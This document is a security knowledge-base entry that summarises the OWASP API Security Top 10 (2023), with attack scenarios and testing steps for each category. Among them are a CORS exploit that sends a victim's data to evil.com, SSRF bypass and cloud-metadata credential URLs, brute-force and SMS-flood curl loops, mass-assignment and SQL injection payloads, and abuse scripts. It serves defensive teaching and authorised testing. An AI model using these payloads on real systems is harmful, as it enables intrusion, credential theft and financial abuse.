# OWASP API Security Top 10 — 2023
> Source: https://owasp.org/API-Security/editions/2023/en/0x00-header/ | RAG Knowledge Base | Full detail preserved
> Released: 2023 | Replaces: OWASP API Security Top 10 2019

---

## Overview — What Changed from 2019 to 2023

| 2019 | 2023 |
|---|---|
| API1 — Broken Object Level Authorization | API1 — Broken Object Level Authorization (unchanged #1) |
| API2 — Broken Authentication | API2 — Broken Authentication (unchanged) |
| API3 — Excessive Data Exposure | API3 — Broken Object Property Level Authorization (merged with #6) |
| API4 — Lack of Resources & Rate Limiting | API4 — Unrestricted Resource Consumption (reframed) |
| API5 — Broken Function Level Authorization | API5 — Broken Function Level Authorization (unchanged) |
| API6 — Mass Assignment | API6 — Unrestricted Access to Sensitive Business Flows (new) |
| API7 — Security Misconfiguration | API7 — Server Side Request Forgery (new, promoted) |
| API8 — Injection | API8 — Security Misconfiguration (demoted) |
| API9 — Improper Assets Management | API9 — Improper Inventory Management (renamed) |
| API10 — Insufficient Logging & Monitoring | API10 — Unsafe Consumption of APIs (new) |

Key additions: SSRF promoted to dedicated category; Mass Assignment merged into object property authorization; "Unsafe Consumption of APIs" (supply chain trust) entirely new.

---

## API1:2023 — Broken Object Level Authorization (BOLA / IDOR)

**CWEs:** CWE-284, CWE-285, CWE-639

### Description
APIs expose endpoints that handle object identifiers. Every API endpoint that receives an ID of an object, and performs any action on the object, should implement object-level authorization checks. Checks should validate that the logged-in user has permission to perform the requested action on the requested object.

### Why APIs Are Especially Vulnerable
- APIs often expose object identifiers directly (numeric IDs, GUIDs, slugs)
- Frontend may hide fields but API accepts them
- No UI enforcement — raw API calls bypass all frontend checks
- Developer assumption that "only the frontend calls this"

### Attack Scenarios
```
# Scenario 1: Numeric IDOR
GET /api/v1/orders/1234          → attacker's order
GET /api/v1/orders/1235          → another user's order (horizontal BOLA)
GET /api/v1/admin/users/1        → admin endpoint (vertical BOLA)

# Scenario 2: GUID IDOR (predictable even with UUIDs if API returns them)
GET /api/v1/documents/550e8400-e29b-41d4-a716-446655440000

# Scenario 3: Indirect IDOR via parameter
GET /api/v1/profile?user_id=victim@example.com

# Scenario 4: BOLA in nested resources
GET /api/v1/organizations/456/members → should only return your org's members
```

### Testing Methodology
1. Identify all object identifiers in requests (path params, query params, POST body)
2. Register two test accounts (A and B)
3. Create resource as A, capture ID
4. Authenticate as B, attempt to access/modify/delete A's resource
5. Check all HTTP methods: GET, PUT, PATCH, DELETE, POST (sub-resources)
6. Test indirect identifiers (email, username, phone) as well as direct IDs
7. Test across all API versions (v1 might be fixed, v2 might not)

### Key Identifiers to Test
- User IDs, account IDs, order IDs, invoice IDs, ticket IDs
- Filename/slug parameters
- Email/username as object references
- Parent resource IDs (organization_id, project_id)

### Bug Bounty Severity: Critical–High

---

## API2:2023 — Broken Authentication

**CWEs:** CWE-204, CWE-307, CWE-798, CWE-916

### Description
Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or exploit implementation flaws to temporarily or permanently assume other users' identities.

### Common Vulnerabilities

**Token Issues:**
- Weak JWT secrets (brute-forceable with hashcat/jwt-cracker)
- JWT algorithm confusion (RS256 → HS256 with public key as HMAC secret)
- `alg:none` accepted (no signature validation)
- JWT without `exp` claim or with very long expiry
- Tokens not invalidated on logout
- Tokens not invalidated on password change

**Credential Issues:**
- No rate limiting on login endpoint (brute force possible)
- No account lockout after failed attempts
- Credential enumeration via different error messages
- Weak password policy enforcement
- Password reset token predictability or long validity
- Password reset link not expiring after use

**Implementation Issues:**
- API key transmitted in URL (logs capture it)
- Bearer token in URL parameters
- Session tokens in GET parameters
- HTTP Basic Auth over HTTP
- Hardcoded credentials in mobile apps or JavaScript

### Testing Methodology
```
# 1. JWT testing
python3 -c "import jwt; print(jwt.decode(token, options={'verify_signature': False}))"
# Check alg, exp, iss, sub fields

# 2. Rate limiting test
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -d "email=user@test.com&password=wrong$i" \
    https://api.target.com/auth/login
done

# 3. Token invalidation test
1. Login, capture token
2. Logout
3. Replay token — should get 401

# 4. Credential enumeration
POST /api/auth/login {"email":"existing@user.com","password":"wrong"}
→ "Invalid password"  ← user exists
POST /api/auth/login {"email":"noone@fake.com","password":"wrong"}
→ "User not found"    ← user doesn't exist (enumeration!)
```

### Bug Bounty Severity: High–Critical

---

## API3:2023 — Broken Object Property Level Authorization

**CWEs:** CWE-213, CWE-915

### Description
This category combines the former API3:2019 (Excessive Data Exposure) and API6:2019 (Mass Assignment). It covers cases where an API exposes object properties that the user should not be able to read (excessive data exposure) or write (mass assignment).

### Excessive Data Exposure
API returns more fields than the client uses/displays:
```json
GET /api/v1/users/me
Response:
{
  "id": 123,
  "email": "user@example.com",
  "name": "John",
  "role": "user",           ← returned but not displayed in UI
  "internal_id": "USR-abc", ← internal field leaked
  "stripe_customer_id": "cus_xxx",  ← sensitive 3rd-party ID
  "is_admin": false,        ← privilege field leaked
  "password_hash": "$2b$..."  ← CRITICAL: hash leaked
}
```

**Testing:** Always inspect full API response, not just what the UI displays. Use network tab / Burp to see complete JSON.

### Mass Assignment
API accepts object properties that should not be user-writable:
```
# Vulnerable: POST /api/v1/users/register
Body: {"email":"a@b.com","password":"test","role":"admin","is_verified":true}

# If API binds all incoming properties to the model:
→ User registered as admin with verified status

# PATCH request injection
PATCH /api/v1/profile
{"name":"John","role":"admin","balance":1000000}
→ If role and balance bound: privilege escalation + financial fraud
```

### Testing Methodology
1. GET all resource endpoints — inspect every field in response
2. Cross-reference with UI — find fields returned but not displayed
3. Attempt to WRITE unexpected fields (role, is_admin, verified, balance, credits)
4. Try both PATCH and PUT with injected properties
5. Check registration endpoint for privilege field injection
6. Test nested objects (`{"settings":{"is_admin":true}}`)

### Bug Bounty Severity: Medium–Critical (depending on what property)

---

## API4:2023 — Unrestricted Resource Consumption

**CWEs:** CWE-770, CWE-400, CWE-799

### Description
Satisfying API requests requires resources such as network bandwidth, CPU, memory, and storage. Other resources are available from service providers (email, SMS, phone calls, biometrics) with a cost per request. A vulnerable API does not impose restrictions on the size or number of resources that can be requested by the client or consumer.

### Attack Scenarios

**Rate Limiting Absent:**
```
# OTP/SMS endpoint — no rate limit = financial attack
for i in {1..10000}; do
  curl -s -d "phone=+1234567890" https://api.target.com/auth/send-sms
done
# Costs target $0.075 * 10000 = $750 in SMS fees

# Password reset email — no rate limit
# Email enumeration + spam victim
for email in $(cat emails.txt); do
  curl -d "email=$email" https://api.target.com/auth/forgot-password
done
```

**Payload Size Abuse:**
```
# No max request size
POST /api/v1/import
Content-Length: 999999999
[massive JSON payload / deeply nested object]

# Regex DoS (ReDoS) via crafted input
POST /api/v1/search
{"query": "a" * 10000 + "!"}
```

**Pagination Abuse:**
```
GET /api/v1/products?limit=999999999  # return entire database
GET /api/v1/search?q=a&page=1&per_page=10000
```

**GraphQL Resource Exhaustion:**
```graphql
# Deeply nested query
{ user { friends { friends { friends { friends { name email } } } } } }

# Alias batching
{ a1: user(id:1) { name } a2: user(id:2) { name } ... a1000: user(id:1000) { name } }
```

### Testing Checklist
- [ ] No rate limit on SMS/email sending endpoints
- [ ] No rate limit on login/OTP verification
- [ ] No maximum `limit` or `page_size` on list endpoints
- [ ] No maximum request body size
- [ ] GraphQL: no depth/complexity limit
- [ ] File upload: no file size limit

### Bug Bounty Severity: Medium–High (financial impact = High)

---

## API5:2023 — Broken Function Level Authorization (BFLA)

**CWEs:** CWE-285

### Description
Complex access control policies with different hierarchies, groups, and roles, and an unclear separation between administrative and regular functions, tend to lead to authorization flaws. By exploiting these issues, attackers can gain access to other users' resources and/or administrative functions.

### Difference from BOLA (API1)
- **BOLA:** Access to wrong OBJECT (horizontal/vertical on data)
- **BFLA:** Access to wrong FUNCTION (endpoints/actions you shouldn't call)

### Common BFLA Patterns

**HTTP Method Escalation:**
```
GET /api/v1/users/123     → 200 (read allowed)
DELETE /api/v1/users/123  → should 403, but returns 200 (delete allowed!)
PUT /api/v1/users/123     → should 403, but returns 200 (update allowed!)
```

**Endpoint Privilege Escalation:**
```
Regular user access:
GET /api/v1/users/me

Admin endpoints (try without admin role):
GET /api/v1/admin/users          → list all users
POST /api/v1/admin/users         → create admin user
DELETE /api/v1/admin/users/123   → delete any user
GET /api/v1/internal/metrics     → internal metrics
POST /api/v1/system/config       → system configuration
```

**Version Downgrade:**
```
# v2 endpoint has BFLA fix, v1 does not
DELETE /api/v2/users/123  → 403 Forbidden
DELETE /api/v1/users/123  → 200 OK (older version lacks check)
```

### Testing Methodology
1. Map all API endpoints (spider, JS analysis, mobile app decompilation)
2. Note which endpoints are "admin-only" per documentation
3. Attempt all admin endpoints as regular user
4. Try all HTTP methods on each endpoint (GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS)
5. Check all API versions for each endpoint
6. Look for endpoint naming patterns: `/admin/`, `/internal/`, `/system/`, `/management/`
7. Check for feature flags that expose hidden endpoints

### Bug Bounty Severity: Critical–High

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

**CWEs:** CWE-284, CWE-285, CWE-799

### Description
Vulnerable APIs expose a business flow — such as buying a ticket, or posting a comment — without compensating for how the functionality could harm the business if used excessively in an automated manner. This category is new in 2023 and focuses on abuse of legitimate functionality at scale.

### Key Distinction
Unlike other categories, the API works as designed — the vulnerability is that automation/scale causes business harm. This is not a technical bug but a business logic/rate limiting issue.

### Attack Scenarios

**Ticket/Inventory Hoarding:**
```
# Automated purchase of limited inventory
while True:
    response = api.post('/checkout', {'ticket_id': 'CONCERT-001'})
    if response['status'] == 'purchased':
        scalper_inventory.append(response['ticket_code'])
    sleep(0.1)
# Buys out entire concert ticket inventory in minutes
```

**Comment/Review Spam:**
```
# Weaponize review system to damage competitor
for _ in range(10000):
    api.post('/reviews', {
        'product_id': competitor_product_id,
        'rating': 1,
        'text': generate_negative_review()
    })
```

**Coupon/Promo Abuse:**
```
# Apply same promo code in parallel (race condition + no rate limit)
threads = [Thread(apply_promo, args=('SAVE50',)) for _ in range(50)]
[t.start() for t in threads]
# Multiple applications of single-use code
```

**Referral/Rewards Abuse:**
```
# Self-referral loop
create_account(referrer=attacker_code)  # earn referral credit
redeem_referral_credit()
delete_account()
repeat()
```

### Testing Approach
1. Identify flows with business value: purchases, referrals, votes, reviews, promo codes
2. Assess if automation detection / rate limiting exists
3. Test both rapid sequential calls AND parallel calls (race conditions)
4. Check for per-user, per-IP, per-device limits
5. Look for missing CAPTCHA on high-value business actions
6. Test account creation limits (are they enforceable?)

### Bug Bounty Severity: Medium–High

---

## API7:2023 — Server Side Request Forgery (SSRF)

**CWEs:** CWE-918

### Description
Server-Side Request Forgery (SSRF) flaws can occur when an API is fetching a remote resource without validating the user-supplied URL. It enables an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or a VPN.

### Why SSRF Got Its Own API Category in 2023
- APIs frequently accept URLs as inputs (webhooks, integrations, import from URL)
- Cloud environments make SSRF → metadata access trivially impactful
- Microservice architectures mean SSRF hits internal services regularly
- AWS IMDS, GCP metadata, Azure IMDS all accessible via SSRF

### Common API SSRF Entry Points
```
# Webhook registration
POST /api/v1/webhooks {"url": "http://169.254.169.254/latest/meta-data/"}

# URL import/fetch
POST /api/v1/import {"source_url": "http://internal-service/admin"}

# Profile picture URL
POST /api/v1/profile {"avatar_url": "http://192.168.1.1/admin"}

# PDF generation
POST /api/v1/reports/generate {"template_url": "file:///etc/passwd"}

# Integration setup
POST /api/v1/integrations {"endpoint": "http://localhost:8080/internal"}

# Slack/Teams notification
POST /api/v1/notifications {"webhook": "http://metadata.internal/"}
```

### SSRF Bypass Techniques
```
# Protocol variations
file:///etc/passwd
dict://127.0.0.1:6379/info   (Redis)
gopher://127.0.0.1:9200/_search  (Elasticsearch)
ftp://internal-ftp/

# IP encoding variations
http://127.0.0.1/          → localhost
http://0x7f000001/         → hex
http://2130706433/         → decimal
http://127.1/              → short form
http://[::1]/              → IPv6

# DNS rebinding bypass
# Register controlled DNS, return external IP for initial check, then resolve to 127.0.0.1

# Redirect-based bypass
http://attacker.com/redirect → 302 → http://169.254.169.254/
```

### Cloud Metadata Endpoints
```
# AWS IMDS v1 (no auth required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDS v2 (requires PUT token first — harder to exploit via SSRF)
http://169.254.169.254/latest/api/token

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2020-09-01

# DigitalOcean
http://169.254.169.254/metadata/v1.json
```

### Bug Bounty Severity: High–Critical (Critical if metadata/credentials accessible)

---

## API8:2023 — Security Misconfiguration

**CWEs:** CWE-2, CWE-16, CWE-209, CWE-319, CWE-388, CWE-548, CWE-732

### Description
API and the systems supporting it may contain various misconfigurations, from unnecessary HTTP methods being enabled, to permissive CORS policies, to verbose error messages, to unnecessary services being exposed.

### Common API Misconfigurations

**CORS Misconfiguration:**
```
# Reflects arbitrary origin
GET /api/v1/user HTTP/1.1
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

# Exploit: malicious page steals API response
fetch('https://api.target.com/v1/user', {credentials:'include'})
  .then(r=>r.json()).then(d=>fetch('https://evil.com/?data='+JSON.stringify(d)))
```

**Missing Security Headers:**
- No `Content-Security-Policy`
- No `X-Content-Type-Options: nosniff`
- No `X-Frame-Options` or `frame-ancestors` CSP
- No `Strict-Transport-Security`
- Missing `Referrer-Policy`

**Verbose Error Messages:**
```
# Stack trace in response
HTTP/1.1 500 Internal Server Error
{
  "error": "NullPointerException at com.company.api.UserService:247",
  "stack": ["UserService.java:247", "...", "..."],
  "sql_query": "SELECT * FROM users WHERE id='abc'",
  "db_host": "internal-db.prod.company.com:5432"
}
```

**Unnecessary HTTP Methods:**
```
OPTIONS /api/v1/users → Allow: GET, POST, PUT, DELETE, PATCH, TRACE
TRACE /api/v1/secret → reflects request back (XST)
```

**Default/Debug Endpoints:**
```
/swagger.json, /api-docs, /openapi.json  → full API documentation
/actuator/health, /actuator/env, /actuator/beans  → Spring Boot internals
/debug, /console, /_profiler  → debug interfaces
/metrics, /info  → sensitive operational data
```

**TLS Misconfiguration:**
- API accepting HTTP alongside HTTPS
- TLS 1.0/1.1 still accepted
- Weak cipher suites enabled

### Bug Bounty Severity: Low–High (depends on what's misconfigured)

---

## API9:2023 — Improper Inventory Management

**CWEs:** CWE-1059

### Description
APIs tend to expose more endpoints than traditional web applications, making proper and updated documentation highly important. A proper inventory of hosts and deployed API versions is essential for mitigating issues such as deprecated API versions and exposed debug endpoints.

### Vulnerability Patterns

**Outdated/Deprecated API Versions:**
```
# Current: /api/v3/users — has auth check
# Deprecated: /api/v1/users — no auth check (still running!)
# Shadow: /api/beta/users — never documented, no security review
```

**API Version Discovery:**
```
# Common version patterns to try
/v1/, /v2/, /v3/, /v4/, /v5/
/api/v1/, /api/v2/
/api/1.0/, /api/2.0/
/api/legacy/, /api/old/, /api/beta/, /api/test/, /api/dev/, /api/internal/
/api/mobile/, /api/ios/, /api/android/

# Header-based versioning
Accept: application/vnd.company.v1+json
X-API-Version: 1
```

**Different Environments Exposed:**
```
# Production app hits:
api.target.com (production)
api-staging.target.com (staging — often less secured)
api-dev.target.com (dev — often no auth)
api-uat.target.com (UAT — sometimes different auth config)
```

**Undocumented Internal APIs:**
```
# Found via:
- JavaScript bundle analysis
- Mobile app decompilation
- Swagger/OpenAPI docs
- Google dorking: site:target.com inurl:/api/
- Wayback Machine historical JS files
- GitHub search for target domain in code
```

### Testing Approach
1. Spider and force-browse all API versions
2. Enumerate subdomains for API-related hostnames
3. Extract API calls from mobile apps (jadx/frida)
4. Analyze JavaScript bundles for hardcoded API paths
5. Check historical API docs (Wayback Machine, cached Swagger)
6. Look for environment leakage (staging/dev exposed publicly)

### Bug Bounty Severity: Medium–High

---

## API10:2023 — Unsafe Consumption of APIs

**CWEs:** CWE-285, CWE-346, CWE-441

### Description
Developers tend to trust data received from third-party APIs more than user input. This is especially true for APIs offered by well-known companies. Because of this, developers tend to adopt weaker security standards than they would apply to user input.

### Vulnerability Patterns

**Trusting Third-Party Data Without Validation:**
```
# Application fetches user profile from OAuth provider
GET https://api.oauth-provider.com/userinfo
Response: {"sub":"123","email":"attacker@controlled.com","role":"admin"}

# App blindly trusts role claim from third party
# → Privilege escalation via compromised/malicious OAuth provider
```

**SSRF via Third-Party Integration:**
```
# Attacker controls external service that the target calls
# Target: POST /api/v1/payment/charge
# → calls attacker-controlled payment gateway
# Attacker's server returns: {"redirect": "http://internal-service/admin"}
# Target follows redirect → internal SSRF
```

**Injection via Third-Party Data:**
```
# App fetches business data from aggregator API
# Aggregator returns: {"company_name": "'; DROP TABLE companies;--"}
# App directly interpolates into SQL → SQLi via third-party data
```

**Webhook Forgery (No HMAC Verification):**
```
# Legitimate webhook: POST /webhooks/payment
# Body signed with HMAC-SHA256 header — app should verify
# Vulnerable app doesn't check signature → attacker sends fake "payment_completed" webhook
```

### Testing Approach
1. Identify all third-party API integrations
2. Check if webhooks are verified (HMAC signature validation)
3. Test if data from third-party APIs is sanitized before use
4. Check if redirect URLs from third parties are validated
5. Look for OAuth provider data injected into queries without sanitization

### Bug Bounty Severity: Medium–High

---

## OWASP API Security Top 10 — Quick Reference Matrix

| # | Category | Primary CWEs | Key Attack | Severity |
|---|---|---|---|---|
| API1 | Broken Object Level Authorization | CWE-284, CWE-639 | IDOR on any object ID | Critical |
| API2 | Broken Authentication | CWE-307, CWE-798 | JWT bypass, brute force, token replay | High–Critical |
| API3 | Broken Object Property Level Authorization | CWE-213, CWE-915 | Mass assignment, data leakage in response | Medium–Critical |
| API4 | Unrestricted Resource Consumption | CWE-770, CWE-400 | SMS flood, pagination abuse, ReDoS | Medium–High |
| API5 | Broken Function Level Authorization | CWE-285 | Admin endpoint access, method escalation | Critical |
| API6 | Unrestricted Access to Sensitive Business Flows | CWE-284, CWE-799 | Scalping, review spam, coupon abuse | Medium–High |
| API7 | Server Side Request Forgery | CWE-918 | Cloud metadata via URL parameter | High–Critical |
| API8 | Security Misconfiguration | CWE-16, CWE-209 | CORS, debug endpoints, verbose errors | Low–High |
| API9 | Improper Inventory Management | CWE-1059 | Old API versions, unprotected staging | Medium–High |
| API10 | Unsafe Consumption of APIs | CWE-346, CWE-441 | Webhook forgery, third-party injection | Medium–High |

---

## API vs Web App Security — Key Differences

| Aspect | Traditional Web App | API |
|---|---|---|
| Session management | Cookie-based | Token-based (JWT, API key, OAuth) |
| Authorization checks | Usually on all pages | Often skipped on API endpoints |
| Error visibility | HTML error pages | JSON stack traces in responses |
| Documentation | Rarely public | Swagger/OpenAPI often exposed |
| Versioning | URL changes | Multiple versions coexist forever |
| Client trust | Browser enforces some controls | Any client can send any payload |
| Input format | HTML forms, URL params | JSON, XML, multipart — flexible |
| State | Server-side sessions | Stateless (JWT) — server can't revoke |

---

## Essential API Recon Commands

```bash
# Find API docs
ffuf -w /wordlists/api-endpoints.txt -u https://target.com/FUZZ \
  -mc 200,301,302,403 -o api-recon.txt

# Common API documentation paths
/swagger.json
/swagger.yaml
/api-docs
/api-docs.json
/openapi.json
/openapi.yaml
/api/swagger.json
/api/openapi.json
/v1/api-docs
/v2/api-docs
/docs
/.well-known/openapi

# Extract API paths from JavaScript
grep -oP '["'"'"'][/api][^"'"'"']*["'"'"']' bundle.js | sort -u

# Test CORS
curl -H "Origin: https://evil.com" -I https://api.target.com/v1/user

# Check all HTTP methods
curl -X OPTIONS https://api.target.com/v1/users -v

# Test for BOLA
# Resource created by user A, accessed as user B
```
